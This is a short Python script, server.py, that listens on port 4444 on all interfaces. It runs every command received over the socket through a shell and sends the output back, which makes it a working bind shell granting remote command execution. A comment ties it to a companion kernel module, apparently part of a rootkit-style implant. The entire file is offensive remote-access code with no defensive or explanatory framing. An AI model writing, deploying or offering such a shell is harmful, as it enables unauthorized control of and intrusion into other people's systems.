# server.py
import socket
import subprocess

HOST = '0.0.0.0'
PORT = 4444  # Match this with your kernel module

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen(1)
    print(f"[*] Listening on {HOST}:{PORT}")
    conn, addr = s.accept()
    print(f"[+] Connection from {addr}")

    with conn:
        while True:
            conn.sendall(b"$ ")  # prompt
            cmd = conn.recv(4096).decode().strip()
            if not cmd or cmd.lower() in ('exit', 'quit'):
                break
            try:
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            except subprocess.CalledProcessError as e:
                output = e.output
            conn.sendall(output or b"(no output)\n")
